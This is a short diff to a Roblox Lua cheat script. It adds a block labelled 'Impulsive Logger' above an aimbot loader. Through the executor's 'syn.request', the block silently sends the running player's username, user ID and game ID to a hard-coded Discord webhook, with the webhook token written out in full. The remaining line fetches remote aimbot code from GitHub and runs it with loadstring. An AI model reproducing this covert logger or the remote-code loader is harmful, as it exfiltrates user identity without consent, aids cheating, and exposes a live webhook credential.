@@ -1,5 +1,17 @@
 --- // Impulsive Logger // ---
+local nerd = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local idiot = game:GetService("Players").LocalPlayer
+local response = syn.request(
 
+    {
+        Url = 'https://discord.com/api/webhooks/1063966870136434688/EjiJzh5gWzxfDgrVOfOBbjSDgAtHwN1k4NDXslXdrP42WH9cAjBaixdijCo2PVmvvCpz',
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = game:GetService('HttpService'):JSONEncode({content = "Username: **"  .. idiot.Name .. "** ┃ User ID: **"  .. idiot.UserId  .. "** ┃ Game ID: **" ..  game.PlaceId.. "**"})
+    }
+);
 ----- // Aimbot Libary // -----
 loadstring(game:HttpGet("https://raw.githubusercontent.com/dohmai/aimbot/main/Main"))()
 
